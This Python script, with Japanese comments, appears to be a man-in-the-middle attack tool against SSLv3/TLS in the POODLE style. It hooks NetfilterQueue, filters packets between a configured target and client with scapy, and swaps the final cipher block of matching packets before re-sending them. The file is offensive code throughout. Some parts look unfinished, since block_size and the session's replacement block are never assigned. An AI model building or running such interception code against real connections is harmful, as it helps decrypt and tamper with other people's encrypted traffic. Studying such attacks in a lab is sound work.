from netfilterqueue import NetfilterQueue
import scapy.all as scapy
from scapy.all import *
from scapy.layers.tls.all import TLS, TLSClientHello, TLSServerHello
from scapy.layers.http import *
from scapy.layers.tls import *
from scapy.all import IP, TCP
from utils.is_sslv3_packet import is_sslv3_packet
from utils.extract_ssl_message_type import extract_ssl_message_type
from utils.modify_and_send_packet import modify_and_send_packet
from scapy.layers.inet import IP, TCP

config = json.load(open('config.json'))

block_size = None


# パケット毎に変わる情報を保持しておく
class Session:
    def __init__(self, src_port):
        self.downgrade_needed = False
        self.src_port = src_port
        self.ciphertext = None
        self.last_seq = None
        self.block = None


sessions = {}


def attack_callback(packet):
    global sessions
    global block_size

    pkt = IP(packet.get_payload())

    if pkt.src == config['target'] and pkt.dst == config['client'] and pkt.haslayer(TLS):
        src_port = pkt['TCP'].sport

        # src_portをキーに持つ形でリクエストごとの暗号文などの情報を保持しておく
        session = sessions[src_port] if src_port in sessions else Session(
            src_port)

        if session.ciphertext is not None and bytes(pkt)[-block_size:] == session.ciphertext[-block_size:]:
            new_bytes = bytes(pkt)[:-block_size] + session.block
            modify_and_send_packet(packet, IP(new_bytes))

        sessions[src_port] = session

    packet.accept()


try:
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, attack_callback)
    nfqueue.run()
except KeyboardInterrupt:
    pass

nfqueue.unbind()
